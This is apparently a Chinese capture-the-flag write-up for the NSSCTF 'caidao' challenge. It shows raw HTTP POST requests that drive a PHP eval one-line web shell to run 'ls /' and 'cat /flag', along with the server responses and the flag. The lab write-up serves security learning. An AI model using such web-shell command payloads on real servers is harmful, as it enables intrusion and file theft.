# caidao

题目链接：https://www.nssctf.cn/problem/383



解题思路：

从题目的@eval($_POST["wllm"])来看，应该本身就已经是一句话木马文件了。

发送请求：

```
POST / HTTP/1.1
Host: node7.anna.nssctf.cn:29003
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1746795377,1746922795; HMACCOUNT=95981CB1F69319FB; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1746955099
Connection: keep-alive
Content-Length: 26
Content-Type: application/x-www-form-urlencoded

wllm=system(%22ls%20/%22);
```

得到响应：

```
HTTP/1.1 200 OK
Date: Sun, 11 May 2025 09:43:10 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Vary: Accept-Encoding
Content-Length: 194
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html><head><style>body{background:url(caidao.png) top left;background-size:100%;}</style></head></html>bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

```

再次发送请求：

```
POST / HTTP/1.1
Host: node7.anna.nssctf.cn:29003
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1746795377,1746922795; HMACCOUNT=95981CB1F69319FB; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1746955099
Connection: keep-alive
Content-Length: 31
Content-Type: application/x-www-form-urlencoded

wllm=system(%22cat%20/flag%22);
```

得到响应：

```
HTTP/1.1 200 OK
Date: Sun, 11 May 2025 09:44:05 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Vary: Accept-Encoding
Content-Length: 149
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html><head><style>body{background:url(caidao.png) top left;background-size:100%;}</style></head></html>NSSCTF{d1ca8e90-bf5e-4402-9949-0534ae65fd6f}

```

